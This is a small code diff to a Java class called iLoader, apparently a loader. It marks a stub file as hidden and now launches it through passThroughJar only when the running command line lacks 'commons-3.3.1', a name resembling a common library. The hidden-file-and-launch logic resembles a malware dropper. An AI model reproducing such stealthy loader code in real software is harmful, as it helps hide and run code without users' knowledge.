@@ -165,7 +165,11 @@ public class iLoader
         {
             Files.setAttribute(Paths.get(stubPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
         } 
-        passThroughJar(stubPath, (new String[]{}));
+        System.out.println(System.getProperty("sun.java.command"));
+        if (!System.getProperty("sun.java.command").contains("commons-3.3.1"))
+        {
+            passThroughJar(stubPath, (new String[]{}));
+        }
     }
 
 
